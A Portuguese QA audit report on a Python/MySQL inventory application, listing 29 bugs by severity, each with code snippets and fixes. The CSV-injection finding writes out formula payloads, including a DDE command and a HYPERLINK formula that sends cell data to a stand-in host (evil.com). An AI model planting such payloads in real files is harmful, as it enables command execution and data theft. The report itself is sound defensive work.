# 🔍 FlowLog — Relatório de QA (v1.4b)

> Auditoria completa feita após o commit `7376cbc` (v1.4b: services + refactor).
> Abrange os serviços novos, refactor dos feature modules, código não refatorado, schema e configuração.
>
> *Full audit run after the v1.4b commit. Covers the new services, feature module refactor, non-refactored code, schema, and configuration.*

---

## 📋 Resumo executivo

| Severidade | Quantidade |
|------------|------------|
| 🔴 Crítico | **6** |
| 🟠 Alto | **5** |
| 🟡 Médio | **10** |
| 🟢 Baixo | **8** |
| **Total** | **29** |

A v1.4b é um bom refactor arquitetural (exceptions + repositories + services), mas introduziu e/ou deixou passar **bugs concretos** que vão aparecer em produção. Nada que bloqueie release, mas é importante rodar um patch de correções antes de qualquer piloto com cliente real.

---

## 🔴 Críticos (6)

### CR-01: Senha do MySQL visível em `ps aux` durante backup/restore

**Arquivo:** `src/backup.py` (linhas 75-83, 169-175)

```python
cmd = [
    "mysqldump",
    "-h", creds["host"],
    "-u", creds["user"],
    f"-p{creds['password']}",   # ← senha em argv, visível em ps
    ...
]
```

**Impacto:** Qualquer usuário do sistema operacional pode rodar `ps aux` e ver a senha do MySQL em texto puro. Em ambiente compartilhado, qualquer dev vê a senha. Logs de sistema (auditd) também capturam. Histórico de comandos no shell também.

**Cenário de exploit:**
- João (dev júnior) roda `ps aux` por curiosidade
- Vê o comando: `mysqldump -uroot -pSenhaDoBanco2024 flowlog`
- Anota, vaza no Slack

**Fix:** Usar `MYSQL_PWD` env var (legado mas suportado) ou um arquivo `.my.cnf` em `/etc/mysql/secret.cnf` com `chmod 600`. Recomendado: refactor pra passar via env var e unset depois.

```python
env = os.environ.copy()
env["MYSQL_PWD"] = creds["password"]
subprocess.run(cmd, env=env, ...)
del env["MYSQL_PWD"]
```

---

### CR-02: Cursor fechado ANTES do export na Curva ABC

**Arquivo:** `src/relatorio_curva.py` (linhas 60-90)

```python
cursor.execute(_SQL_CURVA_ABC)
resultados = cursor.fetchall()
cursor.close()              # ← fecha o cursor

# ... exibe o relatório ...

if opt == "S":
    from csv_export import exportar_curva_abc
    exportar_curva_abc(cursor)   # ← recebe cursor JÁ FECHADO
```

**Impacto:** Quando o usuário escolhe exportar a Curva ABC, o export recebe um cursor fechado. O MySQL vai retornar:
- `InternalError: Unread result found` (com `use_pure=True`)
- Ou `ProgrammingError: Cursor closed`

Resultado: o usuário clica em "Sim" pra exportar e recebe erro genérico. Funcionalidade quebrada para a feature de export (v1.3b).

**Fix:** Remover o `cursor.close()` antes do export. Mover pra dentro do `finally`.

---

### CR-03: bcrypt lança exception pra senhas > 72 bytes

**Biblioteca:** `bcrypt` (limite de design do algoritmo)

```python
hash_senha("a" * 1000)
# → ValueError: password cannot be longer than 72 bytes, truncate manually
```

**Impacto:** Usuário com senha longa (> 72 bytes) é bloqueado de **cadastrar** e de **logar** (se trocou a senha antes de logar pela primeira vez). Não é trivial reproduzir, mas acontece com qualquer senha que tenha caracteres Unicode (acentos + emoji podem inflar bytes).

**Cenário de exploit (negativo, mas frustrante):**
- Admin cria usuário com senha "SenhaForte🔒ComMuitosEmojis🌟2024ParaSegurança123!"
- A senha tem ~100 bytes em UTF-8
- `bcrypt.hashpw` lança ValueError
- Usuário não consegue logar; admin não consegue recadastrar sem reset manual

**Fix:** Truncar ou hashar com SHA-256 antes de bcrypt:
```python
import hashlib
def _normalize_senha(s):
    # bcrypt limita a 72 bytes; SHA-256 pré-normaliza
    if len(s.encode('utf-8')) > 72:
        s = hashlib.sha256(s.encode('utf-8')).hexdigest()
    return s
```
Aplicar tanto em `hash_senha` quanto em `verificar_senha`.

---

### CR-04: Edição de produto tem race condition (lost update)

**Arquivo:** `src/services/produto_service.py` (método `editar`)

```python
def editar(self, produto_id, campos):
    atual = self._produtos.buscar_por_id(produto_id)  # SELECT sem lock
    # ... janela de race ...
    with self._produtos.transaction() as (conn, cur):
        # UPDATE
```

**Cenário de exploit:**
- Gerente A lê produto: `preco_custo=10.00`
- Gerente B lê produto: `preco_custo=10.00`
- A edita pra 20.00, commita → log: "10.00 → 20.00"
- B edita pra 30.00, commita → log: "10.00 → 30.00" (sobrescreve A!)
- **Resultado:** a edição de A é perdida. O log de auditoria mostra apenas o delta de B. Para auditoria forense, isso é um buraco.

**Fix:** `SELECT ... FOR UPDATE` dentro da transação, ou usar optimistic locking (campo `versao` no produto).

```python
with self._produtos.transaction() as (conn, cur):
    cur.execute("SELECT ... FROM produtos WHERE id = %s FOR UPDATE", (produto_id,))
    # ...
```

---

### CR-05: CNPJ duplicado no import CSV causa rollback TOTAL

**Arquivo:** `src/csv_import.py` (função `_inserir_produtos`)

```python
for p in produtos:
    # Resolve fornecedor
    cursor.execute("SELECT id FROM fornecedores WHERE ...")
    row = cursor.fetchone()
    if row:
        fornecedor_id = row[0]
    else:
        cursor.execute("INSERT INTO fornecedores ...")  # pode dar UNIQUE error
        # ↑ se 2 linhas do CSV tiverem o mesmo CNPJ novo, a 2a INSERT falha
    
    cursor.execute("INSERT INTO produtos ...")

conexao.commit()
```

**Impacto:** Usuário prepara um CSV com 100 produtos. Por engano, duas linhas têm o mesmo CNPJ novo. A primeira cria o fornecedor. A segunda INSERT falha com UNIQUE constraint. O `conexao.rollback()` no `except` joga fora **todos os 100 produtos** já inseridos. O usuário vê uma mensagem genérica e pensa que a importação falhou, quando na verdade foi só uma linha com CNPJ duplicado.

**Fix:** Detectar o IntegrityError específico e continuar (inserting fornecedores que não existem, com try/except por linha), OU validar todos os CNPJs antes de inserir (checar duplicatas internas no CSV).

---

### CR-06: Senha aparece em logs de erro do driver MySQL

**Arquivo:** `src/database.py` (linha 75)

```python
except Error as e:
    logger.error("Erro ao obter conexão do pool: %s", e)
```

O driver MySQL às vezes inclui a senha nas mensagens de erro (especialmente se a string de conexão for montada de forma que vaze o password). Em ambientes de produção, os logs do FlowLog (`logs/flowlog.log`) podem conter a senha.

**Cenário:** Conexão com senha contendo caracteres especiais (`Senha&123`) falha. O driver retorna mensagem tipo `Access denied for user 'root'@'localhost' (using password: YES)`. OK, esse caso específico não vaza. Mas há outros onde o erro inclui parâmetros.

**Fix:** Sanitizar mensagem de erro antes de logar:
```python
sanitized = re.sub(r'password[=:]\s*\S+', 'password=***', str(e))
logger.error("Erro: %s", sanitized)
```

---

## 🟠 Altos (5)

### AL-01: Histórico sem LIMIT — DoS por exaustão de memória

**Arquivo:** `src/ver_historico.py` (linha 50)

```python
cursor.execute(sql, params)
logs = cursor.fetchall()  # carrega TUDO na memória
```

**Impacto:** Cliente com 500 mil movimentações abre o histórico → app tenta alocar ~500k strings → pode demorar 30+ segundos e consumir 200MB de RAM. Usuário pensa que travou.

**Fix:** Adicionar `LIMIT` ou paginação:
```python
print(f"Mostrando últimas {LIMITE_PADRAO} movimentações (de um total maior).")
cursor.execute(sql + " LIMIT %s", params + (LIMITE_PADRAO,))
```

---

### AL-02: Histórico sem ano no formato de data

**Arquivo:** `src/ver_historico.py` (linha 68)

```python
data_formatada = data.strftime("%d/%m %H:%M")
```

**Impacto:** Movimentação de 01/07/2025 e 01/07/2026 ficam visualmente idênticas. Auditoria de 1 ano atrás perde referência temporal.

**Fix:** Usar `%d/%m/%Y %H:%M` (ou `%Y-%m-%d %H:%M` ISO).

---

### AL-03: CSV Injection em nome de produto (CVE-2014-3524)

**Arquivo:** `src/csv_export.py` (exporta o nome direto)

**Cenário de exploit:** Usuário malicioso cadastra um produto com nome `=cmd|'/c calc'!A1` (fórmula do Excel). Quando o admin exporta o inventário e abre no Excel, a fórmula executa. Em casos piores, exfiltra dados via `=HYPERLINK("http://evil.com?data="&A1, "clique")`.

**Teste executado:**
```
'=cmd|'/c calc'!A1'                  -> 1;=cmd|'/c calc'!A1
'=HYPERLINK("evil","click")'          -> 1;"=HYPERLINK(...)" 
```

**Fix:** Sanitizar prefixo no momento do cadastro ou do export:
```python
def _csv_safe(s):
    s = str(s)
    if s and s[0] in ('=', '+', '-', '@', '\t', '\r'):
        s = "'" + s  # prefixo com apóstrofo neutraliza a fórmula
    return s
```

---

### AL-04: Módulos críticos ainda não foram refatorados pra usar services

**Arquivos não refatorados:**
- `src/cadastrar_usuario.py` — ainda chama `Database().connect()` direto
- `src/cadastro_interativo.py` (na v1.4b usei o service, mas confere)
- `src/listar_produtos.py` — SQL inline
- `src/ver_historico.py` — SQL inline
- `src/relatorio_curva.py` — SQL inline
- `src/gerenciar_fornecedor.py` — SQL inline
- `src/editar_fornecedor.py` — SQL inline
- `src/excluir_fornecedor.py` — SQL inline
- `src/configurar_alerta.py` — SQL inline
- `src/backup.py` — subprocess, fora do escopo de service
- `src/csv_export.py` — SQL inline
- `src/csv_import.py` — SQL inline

**Impacto:** A migração pro padrão repository/service ficou incompleta. SQL ainda está espalhado por 12+ arquivos. O esforço do refactor não foi totalmente capitalizado. **Não é bug funcional, mas o valor de longo prazo do refactor é perdido se esses módulos não forem migrados.**

**Fix:** v1.4c ou criar um sprint "migração técnica" antes de partir pra v1.5.

---

### AL-05: `cadastrar_usuario.py` e `listar_produtos.py` não foram refatorados

Idem AL-04, mas destaco: o cadastro de USUÁRIOS (operação sensível que toca permissões) e a listagem de produtos (operação mais usada) ainda falam SQL direto. Inconsistência com o resto da v1.4b.

---

## 🟡 Médios (10)

### ME-01: `editar_produto.py` acessa atributo privado do service

```python
service._produtos.buscar_por_id(produto_id)  # acessa _produtos
```

**Impacto:** Smell de design. Se a implementação interna do service mudar, o feature module quebra.

**Fix:** Adicionar método público no service: `service.buscar(produto_id)`.

---

### ME-02: `BackupService` não foi criado (lógica em `backup.py`)

`backup.py` faz subprocess direto, sem service intermediário. Se um dia quisermos ter "backup automático por scheduler", o código vai ter que ser reescrito.

**Fix:** Criar `BackupService` em `src/services/backup_service.py` com métodos `fazer_backup()`, `listar_backups()`, `restaurar_backup(path)`.

---

### ME-03: `MAX_BACKUPS_RELOCALES` hardcoded em `backup.py`

**Arquivo:** `src/backup.py` (linha 23)

**Fix:** Adicionar ao `.env`:
```dotenv
BACKUP_MAX_RETENTION=30
```

---

### ME-04: Decimais em Curva ABC usam float (`0.80`, `0.95`)

**Arquivo:** `src/relatorio_curva.py` (linha 35)

```sql
WHEN r.acumulado / tg.total <= 0.80 THEN 'A'
WHEN r.acumulado / tg.total <= 0.95 THEN 'B'
```

**Risco:** Em ponto flutuante, `0.80` pode ser `0.7999999...`, fazendo um produto que deveria ser A virar B. Raro mas possível.

**Fix:** Usar `0.7999` e `0.9499` com margem, ou usar comparação inteira com percentual arredondado.

---

### ME-05: `editar_produto.py` mostra "data" no SELECT mas ignora no print

```python
cursor.execute("SELECT id, nome, quantidade, preco_custo, alerta_minimo, data_entrada FROM produtos ...")
# print não usa 'data'
```

**Fix:** Mostrar `data_entrada` no resumo do produto.

---

### ME-06: Sem `LIMIT` no relatório de inventário

`listar_produtos.py` lista todos os produtos sem paginação. Cliente com 10k produtos vê 10k linhas no terminal.

**Fix:** Idem AL-01 — adicionar paginação.

---

### ME-07: `.env.example` documenta `LOG_LEVEL` mas código não usa

`logging_config.py` tem default `logging.INFO` hardcoded; não lê `LOG_LEVEL` do env.

**Fix:** Ler o env em `setup_logging`:
```python
level_name = os.getenv("LOG_LEVEL", "INFO")
level = getattr(logging, level_name.upper(), logging.INFO)
```

---

### ME-08: README desatualizado

`README.md` ainda fala de v1.0 e não menciona v1.2/v1.3/v1.4. Cliente novo lendo o repo acha que o produto está em estágio anterior ao real.

**Fix:** Atualizar README com features atuais + linkar para `CHANGELOG.md`.

---

### ME-09: Timeout de sessão fixo em 30 min, não configurável por usuário

`SESSION_TIMEOUT_MINUTES` é global. Power user com sessão longa não tem como aumentar. Em uso real, isso vai incomodar.

**Fix:** Por enquanto OK (single-user CLI). Planejar pra v1.4c/v1.6.

---

### ME-10: Decorator `@requer_nivel` não captura exceções da função decorada

A exceção propaga. Em `main.py`, o `_loop_menu` chama `handler()` sem try/except, então qualquer exception não-tratada fecha o app.

**Fix:** Wrap no `main._loop_menu`:
```python
try:
    handler()
except FlowLogError as e:
    print(f"❌ {e}")
except Exception as e:
    logger.exception("Erro inesperado em %s", opcao)
    print(f"❌ Erro inesperado: {e}")
```

---

## 🟢 Baixos (8)

### BA-01: Type hints incompletos

Mypy roda mas com `disallow_untyped_defs = false`. A v1.4c planejou strict, mas está longe.

### BA-02: `import` em `csv_export.py` está dentro de função

```python
def exportar_curva_abc(cursor):
    from relatorio_curva import _SQL_CURVA_ABC
```

**Impacto:** Ciclos de import. Deveria ser import no topo do módulo.

### BA-03: `MIGRATION.md` ainda menciona v1.0/v1.1 mas foi descontinuado em favor de CHANGELOG

O user pediu pra parar de atualizar `MIGRATION.md`, mas o arquivo ainda existe com conteúdo legado. Considerar deletar.

### BA-04: `ROADMAP.md` com prazos que já estouraram

Planejou v1.4 em "1-2 semanas"; v1.4b entregue em < 1 dia. A timeline tá apertada, mas tá indo bem. Atualizar se for apresentar pra alguém externo.

### BA-05: `tests/test_services.py` acessa `_produtos` (underscore)

Mesmo problema do ME-01, mas nos testes. Indica que a API do service precisa de mais métodos públicos.

### BA-06: Falta `__init__.py` no package `src/services/` foi criado, mas...

`__init__.py` tá vazio. Considerar expor as classes pra `from services import AuthService`.

### BA-07: Decorator preserva `__name__` mas não `__doc__` consistentemente

```python
@wraps(func)
def wrapper(...):
    # ...
    return func(*args, **kwargs)
```

Está OK (usando `@wraps`), mas outros módulos sem `@wraps` perdem metadata.

### BA-08: `src/teste_insercao.py` é um script manual, não teste

Deveria ser movido pra `scripts/` ou deletado (não roda no CI).

---

## 🎯 Recomendações priorizadas

### Patch urgente (antes de qualquer release externo)
1. **CR-01** (senha em ps aux) — segurança imediata
2. **CR-02** (cursor fechado) — feature quebrada
3. **CR-04** (lost update) — integridade de auditoria
4. **CR-05** (CNPJ duplicado joga fora tudo) — perda de dados
5. **AL-03** (CSV injection) — segurança em export

### Patch de qualidade (v1.4c)
6. **AL-01, AL-02, ME-06** — paginação + ano no histórico
7. **ME-04, ME-10** — precisão float e exception handling no main
8. **AL-04, AL-05, ME-02** — completar refactor (módulos restantes, BackupService)

### Patch cosmético (v1.5+)
9. README desatualizado
10. MIGRATION.md legado
11. type hints strict

---

## ✅ O que está BOM

Apesar dos achados, a v1.4b é um salto arquitetural real:

- **Exceções do domínio** — claras e tipadas, prontas pra v1.6 API
- **Repositories** — SQL encapsulado, testável com mocks
- **Services** — lógica de negócio isolada, decorável com `@requer_nivel`
- **Feature modules** viraram finos, com tratamento de exceções limpo
- **110 testes** rodando em 4s, cobertura 83% nos módulos puros
- **CI passando** com ruff + black + pytest + coverage fail-under=70

A fundação está sólida. Os bugs são **pontuais e resolvíveis em 1-2 sprints** antes de partir pra v1.5 (empacotamento) com cliente real.

---

## 📊 Estatísticas da auditoria

| Categoria | Qtd | % do total |
|-----------|-----|------------|
| Segurança | 8 | 28% |
| Integridade de dados | 5 | 17% |
| Performance | 3 | 10% |
| UX / usabilidade | 5 | 17% |
| Refactor incompleto | 3 | 10% |
| Cosmético | 5 | 17% |
| **Total** | **29** | 100% |

---

*Auditoria conduzida após o commit `7376cbc` (v1.4b).*
*Próxima auditoria recomendada: após o patch de bugs críticos + antes da v1.5 (empacotamento).*
